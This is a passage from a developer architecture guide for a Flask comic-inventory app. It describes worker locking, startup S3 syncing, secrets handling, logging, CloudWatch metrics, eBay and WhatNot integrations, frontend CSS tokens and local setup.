| No logging of secrets | `safe_error_message(exc)` used for all client-facing errors; raw exceptions + tokens never logged |
| Vault encrypted at rest | All Ansible variables (including secrets) stored in `deployment/group_vars/vault.yml` (AES-256 ansible-vault); never committed in plaintext |

---

## Concurrency and Worker Safety

The app runs as 4 Gunicorn sync workers (separate processes, not threads within
one process). Three distinct locking strategies prevent data corruption.

### Cross-worker sync lock

`app/utils/sync_state.py` — `SyncState` singleton.

The startup S3 sync runs in a background thread inside each worker. Only one
worker should run the sync; the other three must skip it. Coordination uses
`fcntl.flock` on a shared file (`instance/.sync.lock`):

```
Worker 1: flock(LOCK_EX | LOCK_NB) → succeeds → runs sync
Worker 2: flock(LOCK_EX | LOCK_NB) → EAGAIN  → skips sync
Worker 3: flock(LOCK_EX | LOCK_NB) → EAGAIN  → skips sync
Worker 4: flock(LOCK_EX | LOCK_NB) → EAGAIN  → skips sync
```

The lock is released when sync completes, fails, or is unlocked via
`sync_state.unlock_sync()`. An in-process `threading.Lock` additionally
protects all state fields (progress counters, timestamps) from concurrent
reads within the same worker's threads.

**Sync state machine:**

| Status | Meaning |
|--------|---------|
| `not_started` | Default state; sync thread not yet launched |
| `in_progress` | Worker holds `fcntl` lock; sync running |
| `synchronized` | Sync completed successfully; lock released |
| `failed` | Sync failed; lock released; `error_message` populated |

State includes progress fields (`total_backups`, `completed_backups`,
`current_backup`, `retry_count`, `max_retries=3`) exposed via the
`/api/system/sync-status` endpoint.

`@sync_not_locked` route decorator reads `sync_state.is_locked()` and
returns 503 to any write operation attempted while a sync is running.

To skip sync entirely (for local development with no S3 access):
```bash
SKIP_S3_SYNC=1 python runapp.py
```

### CSV file locking

`CSVService` (`app/services/csv_service.py`) acquires a `filelock.FileLock`
before every write. The lock file lives at `{csv_path}.lock`. All four
Gunicorn workers share the same `items.csv` file via the EBS volume — the
lock prevents concurrent writes from corrupting it.

```python
# All writes go through this pattern
with filelock.FileLock(f"{csv_path}.lock"):
    # read → modify → write
```

Reads do not acquire the lock (acceptable eventual-consistency for the
read-heavy inventory browse use case).

### eBay listing cache

`app.ebay_cache` is a per-process dict protected by `app.ebay_cache_lock`
(a `threading.Lock`). It caches eBay listing status fetched from the eBay API
to avoid redundant API calls across requests within the same worker.

```python
# Structure: {"{username}_{sku}": {"fetched_at": ISO, "status": ..., ...}}
```

A `before_request` hook (`check_ebay_cache_expiry`) evicts entries older than
1 hour. The eviction walk first snapshots keys under the lock, then removes
expired keys under the lock, to avoid `RuntimeError: dictionary changed size
during iteration`.

Because the cache is per-process, across 4 workers each worker may have a
slightly different view of eBay listing status. This is an accepted tradeoff
for the 1-hour TTL — the cache is informational, not authoritative.

---

## Startup Sequence

`create_app()` executes these steps synchronously before returning the app:

```
1.  Load configuration (Config class, get_secret())
2.  Configure app.logger, service_logger, cleanup_logger (rotating files)
3.  Initialize security middleware (before_request + after_request hooks)
4.  Ensure required directories exist (uploads, csv, sku)
5.  Migrate legacy flat-file user data (one-time, idempotent)
6.  Sync user_preferences.json with S3 (see tie-breaking rules below)
7.  Initialize UserManager — load users into memory; init from USERS secret if empty
8.  Per registered user:
    a. Sync SKU counter: highest value wins (local vs S3)
    b. Sync items.csv: newest timestamp wins; if local is newer but ≤ 300 bytes,
       prefer S3 (guards against startup with an empty/corrupt local file)
    c. If neither exists, initialize empty CSV with schema headers
9.  Cleanup expired trash items (all users)
10. Start background thread (one worker only — fcntl-guarded):
    a. sync_images_from_s3() for each user (bi-directional)
    b. sync_exports_from_s3() for each user (bi-directional)
    c. Run HealthCheckService (orphan detection + deletion)
    d. Release fcntl sync lock
11. Register blueprints (auth_bp, main_bp, api_bp)
12. Register Jinja2 globals (csrf_token)
13. Initialize app.ebay_cache dict + app.ebay_cache_lock
14. Initialize eBay category cache from instance/ebay_category_cache.json
15. Install before_request hook for 1-hour eBay cache TTL eviction
16. Per-user CSV health check: log WARNING if item count < 5
17. Auto-regenerate analytics mockup PNGs (if generation script hash changed or PNGs missing)
```

### S3 sync tie-breaking rules

**User preferences (`user_preferences.json`):**

| Condition | Action |
|-----------|--------|
| No local file | Download from S3 |
| S3 is newer AND S3 has ≥ local user count | Download from S3 |
| S3 is newer BUT local has MORE users | Keep local, upload to S3 (safety: local is authoritative when user count is higher) |
| Local is newer | Upload to S3 |
| Same timestamp | No-op |
| S3 missing | Upload local to S3 |

**SKU counter:** `max(local_sku, s3_sku)` — always preserves the highest to avoid SKU collision.

**CSV inventory:** newest timestamp wins except: if local CSV is 300 bytes or
smaller (indicates empty-headers-only file) and S3 has a real CSV, prefer S3
regardless of timestamp. This prevents overwriting a full S3 inventory with
an empty local file created by a fresh clone.

### Disabling S3 sync

```bash
SKIP_S3_SYNC=1 python runapp.py
```

When `SKIP_S3_SYNC=1` the background thread returns immediately. All other
startup steps run normally. Useful for local development with no S3 access.

---

## Configuration and Secrets

### Config classes

| Class | env | `DEBUG` | `SECRET_KEY` |
|-------|-----|---------|-------------|
| `DevelopmentConfig` | `development` | `True` | Fresh random on each restart (clears sessions) |
| `ProductionConfig` | `production` | `False` | Must be set in Secrets Manager (startup validation) |

### `get_secret(key, default=None)`

Three-tier lookup in `app/config.py`:

```
AWS Secrets Manager  →  environment variable  →  default
```

In production the app reads all secrets from Secrets Manager via the EC2
instance IAM role — no static credentials on disk. In local development, a
`.env` file generated from the Ansible vault is used as the environment
variable tier.

### Key config values consumed

| Key | Purpose |
|-----|---------|
| `SECRET_KEY` | Flask session signing |
| `S3_BUCKET_NAME` | S3 bucket for all object storage |
| `S3_FOLDER` | Top-level S3 prefix (e.g. `production`) |
| `AWS_REGION` | AWS region for all SDK calls |
| `SNS_TOPIC_ARN` | Optional alert delivery |
| `EBAY_PRODUCTION_APP_ID` / `CERT_ID` / `DEV_ID` / `TOKEN` | eBay API credentials |
| `APP_NAME` | App identity injected into logs and metric namespaces |

---

## Logging

### Three dedicated loggers

| Logger name | App attribute | File (prod) | File (dev) |
|-------------|--------------|-------------|------------|
| `app` / Flask default | `app.logger` | `/var/log/apps/{app_name}/app.log` | `instance/app.log` |
| `service` | `app.service_logger` | `/var/log/apps/{app_name}/service.log` | `instance/service.log` |
| `cleanup` | `app.cleanup_logger` | `/var/log/apps/{app_name}/cleanup.log` | `instance/cleanup.log` |

Each logger is independent (`propagate = False`) so records are not
double-logged to Gunicorn's stderr.

### Log format

`app.logger` (main app log):
```
[2026-05-08 14:23:01,456] brian - INFO in comics: Added comic SKU-1042
 └───────────────────────  └────  └──  └──────   └────────────────────
    asctime                 user  lvl   module     message
```

`service` and `cleanup` loggers:
```
[2026-05-08 14:23:01,456] INFO in s3_service: Synced 12 images for brian
```
(No `%(username)s` — these run in background threads outside a request context.)

### Log rotation

All handlers use `RotatingFileHandler`:

| Environment | Max file size | Backup count |
|-------------|--------------|-------------|
| Production | 10 MB | 10 (each logger) |
| Development | 10 MB | 5 (app.log only) |

When a file reaches 10 MB it is renamed to `.log.1`, `.log.2`, …, up to the
backup count. The oldest rotation is deleted when the limit is exceeded.

### `error.log` (production only)

In production an additional `RotatingFileHandler` at `ERROR` level is added
to every logger, writing to `/var/log/apps/{app_name}/error.log`. This file
contains only ERROR and CRITICAL entries from all three loggers combined —
useful for a quick triage view without grepping the verbose logs.

### `UserContextFilter`

The `UserContextFilter` (defined in `app/__init__.py`) injects a `username`
field into every log record:

- Inside a request context: reads `g.username` (set by `@login_required`)
- Outside request context (background threads): writes `'system'`
- Unauthenticated request (no `g.username`): writes `'anonymous'`

### `propagate = False` rationale

By default Python loggers propagate records up to the root logger, which
Gunicorn also attaches its own handlers to. Without `propagate = False`,
every application log line would appear twice — once in the app's rotating
file and once in Gunicorn's stderr. Every logger in this app sets
`propagate = False` to prevent that.

### Logging utilities

`app/utils/logging_utils.py` exports:

| Helper | Purpose |
|--------|---------|
| `safe_error_message(exc)` | Returns a generic "something went wrong" string for client-facing JSON responses in production. Full exception detail goes to the logger. **Always use this in `jsonify` error responses — never `str(e)`.** |
| `get_service_logger()` | Returns `logging.getLogger('service')` |
| `get_cleanup_logger()` | Returns `logging.getLogger('cleanup')` |

### CloudWatch log shipping

All log files are forwarded to CloudWatch by the CloudWatch agent installed
on the EC2 instance. See the AWS Deployment Architecture reference for log
group names and retention settings.

---

## Monitoring and Metrics

### `@monitor_endpoint` decorator

`app/utils/monitoring.py` provides a decorator that sends two CloudWatch
metrics for any function it wraps:

```python
@monitor_endpoint(metric_prefix='API')
def my_route():
    ...
```

Metrics emitted (dimensions: `endpoint`, `method`, `status`):

| Metric name | Unit | Value |
|-------------|------|-------|
| `{prefix}ResponseTime` | Milliseconds | Wall-clock time of the function call |
| `{prefix}RequestCount` | Count | Always 1 (one per call) |

`status` dimension is `'success'` normally; `'error'` if the function raises
an exception (the exception is still re-raised after the metric is sent).

Metric send failures are caught and logged at DEBUG level — they never affect
the response.

### `track_user_action(action_name, **extra_dimensions)`

Sends a `UserAction` CloudWatch metric (count=1) with dimensions `action` and
`username`. Used for tracking significant events (login, export, bulk
operation). Safe to call from any request context; silently no-ops if called
outside an app context.

### CloudWatch agent metrics

The CloudWatch agent on EC2 additionally ships system metrics:
CPU, memory, disk usage, network I/O. See the AWS Deployment Architecture
reference for alarm thresholds.

---

## Platform Integrations

### eBay Trading API

**Service:** `app/services/ebay_service.py` → `ebay_service` singleton.

Key operations: `AddFixedPriceItem`, `ReviseFixedPriceItem`, `EndItem`,
`GetMyeBaySelling`, `GetSuggestedCategories`, `GetCategorySpecifics`.

**Payload sanitization:** `_sanitize_trading_payload_strings(payload)` walks
the entire payload dict recursively and escapes bare `&` (not already part of
`&amp;`, `&gt;`, or other named entities) before the XML request is sent.
A bare `&` in a title causes eBay to return `Code: 5 — XML Parse error`.
Do not manually escape `&` — the sanitizer handles it automatically.

**Category cache:** `instance/ebay_category_cache.json` (shared, not
per-user). Populated by `ebay_service.initialize_category_cache()` at startup.
Stores category IDs and item-aspect definitions to reduce API round-trips
during listing creation. Updated manually via the eBay Taxonomy API routes.

**Per-user credentials:** Each user's eBay OAuth token is stored in AWS
Secrets Manager under a path that includes the username. Retrieved via
`user_secrets_service`. Never written to CSV, JSON files, or logs.

**Scheduled ↔ Live toggle:** `/api/comic/<sku>/ebay/relist` accepts
`{"mode": "list"}` (go live immediately) or
`{"mode": "future", "schedule_time": "<ISO-8601>"}` (schedule). The endpoint
ends the current listing internally before relisting — no separate end call
is needed from the client.

**Daily API limit:** 5000 calls (`EBAY_DAILY_LIMIT` config). Tracked per
session; not persisted across restarts.

### WhatNot exports

WhatNot is a live-auction platform. The app tracks a `whatnot_listed` field
per item and can generate a WhatNot-formatted CSV export.

`app/utils/whatnot_validators.py` defines:
- `WHATNOT_FIELD_VALIDATION` — dict of field name → validation rules
- `build_whatnot_export_row(item)` — maps item fields to WhatNot column names
- `get_whatnot_export_fieldnames()` — ordered list of WhatNot CSV headers
- `is_whatnot_listed(item)` — returns True if the item is marked as listed on WhatNot

WhatNot exports are generated via the download route and are CSV-injection
sanitized via `sanitize_row()` before writing.

### Analytics heatmap

`app/services/analytics_service.py` — `HeatmapAnalyzer`.

`app/models/analytics.py` — `AnalyticsStore`.

The analytics system records where users click on pages, accumulating a
heat map of interaction density. Events are sent via `POST /api/analytics/`
from the browser and stored in per-user JSON files under
`instance/data/{username}/analytics/`. The analytics dashboard
(`/analytics`) reads these files and renders the heatmap visualization.
Mockup PNGs of each page are auto-generated at startup from
`app/scripts/util_generate_page_images.py` and stored in
`app/static/analytics/`. If the generation script changes between restarts
the PNGs are automatically regenerated.

---

## Frontend Design System

All visual styling is controlled by two shared CSS files loaded in `base.html`.

### `app/static/css/tokens.css`

Single source of truth for the entire color palette, spacing scale, typography,
border radii, and shadow tokens. All template styles reference these:

```css
/* example usage in any template */
.my-card {
    background: var(--color-elevated);
    color: var(--color-text);
    border-radius: var(--radius-md);
    box-shadow: var(--shadow-md);
}
```

Key tokens:

| Token | Value | Role |
|-------|-------|------|
| `--color-bg` | `#1B1A1B` | App background |
| `--color-surface` | `#242223` | Top/bottom bars |
| `--color-elevated` | `#2D2B2C` | Cards, modals |
| `--color-inset` | `#171616` | Input fields |
| `--color-accent` | `#E2E800` | Primary highlight (bright yellow) |
| `--color-accent-2` | `#5C9EB8` | Secondary accent (steel blue) |
| `--color-danger` | `#C45C5C` | Destructive actions |
| `--color-text` | `#E8E8E6` | Primary text |
| `--color-text-muted` | `#C5C2BE` | Secondary text |

### `app/static/css/components.css`

Shared component classes used across all templates:

| Group | Classes |
|-------|---------|
| Buttons | `.btn`, `.btn-primary`, `.btn-secondary`, `.btn-danger`, `.btn-sm` |
| Modals | `.modal`, `.modal-content`, `.modal-header`, `.modal-body`, `.close-btn` |
| Forms | `.form-group`, `.form-label`, `.form-input`, `.form-select` |
| Cards | `.card`, `.stat-card` |
| Layout | `.page-header`, `.page-controls-row`, `.action-section`, `.footer-bar` |
| Feedback | `.notification`, `.section-label` |

**Never re-declare these classes in template `<style>` blocks.** Page-specific
styles exist only in `{% block extra_css %}` for layout unique to that page.

### Template inheritance

All pages extend `base.html`:

```jinja2
{% extends "base.html" %}

{% block title %}Page Title{% endblock %}
{% block extra_css %} {# page-specific layout only #} {% endblock %}
{% block content %} {# page body #} {% endblock %}
{% block extra_js %} {# page-specific scripts #} {% endblock %}
```

`base.html` provides: navigation, `tokens.css`, `components.css`, CSRF meta tag,
Escape-to-close modal behaviour, and the global modal stack.

---

## Key Patterns and Conventions

### 1 — All API routes return JSON

```python
return jsonify({'success': True, 'data': result}), 200
return jsonify({'error': safe_error_message(e)}), 500
```

Never `str(e)` in responses — use `safe_error_message()`.

### 2 — Service singletons, not re-instantiation

```python
# ✓ correct
from app.services.csv_service import csv_service

# ✗ wrong
service = CSVService()
```

### 3 — User context for all paths

```python
# ✓ correct
from app.utils.user_context import get_user_csv_file
csv_path = get_user_csv_file(username)

# ✗ wrong
csv_path = f"instance/data/{username}/items.csv"
```

### 4 — Image upload security pattern

See [File upload security](#file-upload-security) for full detail. Summary:

```python
from app.utils.upload_security import validate_uploaded_image, UploadValidationError

try:
    safe_name, ext = validate_uploaded_image(request.files['image'])
except UploadValidationError as e:
    return jsonify({'error': str(e)}), e.status_code

stored_filename = f"{sku}.{ext}"   # never use safe_name as the stored key
```

### 5 — eBay payload sanitization

```python
# ✓ correct — sanitizer runs automatically
ebay_service.add_fixed_price_item(payload)

# ✗ wrong — manual escaping on top of automatic sanitization
title = comic['title'].replace('&', '&amp;')
```

### 6 — JavaScript confirm flow (snapshot → try → finally)

```javascript
async function confirmAction() {
    const sku = pendingItem.sku;       // snapshot state first
    try {
        await executeAction(sku);      // executor takes args, not globals
    } finally {
        pendingItem = { sku: null };   // always reset, even on error
    }
}
```

### 7 — Version injection

The `inject_version()` context processor in `create_app()` reads
`instance/app_version` (written by the deploy playbook), then falls back to
`git rev-list --count HEAD`. Every template gets `app_version` and
`app_version_display` automatically.

---

## Local Development Setup

```bash
# 1. Clone and create virtual environment
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt

# 2. Generate .env from Ansible vault (requires ansible-vault + ~/.vault_pass)
cd deployment && python scripts/local_dev_setup_env.py && cd ..

# 3. Or create .env manually for a new project:
cat > .env << 'EOF'
SECRET_KEY=dev-secret-key-local
S3_BUCKET_NAME=your-bucket-name
S3_FOLDER=development
AWS_REGION=us-east-2
EBAY_PRODUCTION_APP_ID=
EBAY_PRODUCTION_CERT_ID=
EBAY_PRODUCTION_DEV_ID=
EBAY_PRODUCTION_TOKEN=
EOF

# 4. Run the development server
FLASK_ENV=development python runapp.py    # http://localhost:8000
```

### Dev vs production differences

| Aspect | Development | Production |
|--------|------------|-----------|
| `DEBUG` | `True` | `False` |
| `SECRET_KEY` | Fresh random on each restart | Fixed; from Secrets Manager |
| Log destination | `instance/app.log` + console | `/var/log/apps/{app_name}/*.log` + CloudWatch |
| Secrets | `.env` file | AWS Secrets Manager via IAM role |
| S3 access | Uses explicit key/secret from `.env` (optional) | IAM instance profile (no keys) |
| `SESSION_COOKIE_SECURE` | `False` | `True` (or opt-out with `ALLOW_INSECURE_COOKIES=1`) |
| S3 sync | Optional (set `SKIP_S3_SYNC=1` to disable) | Always runs on startup |

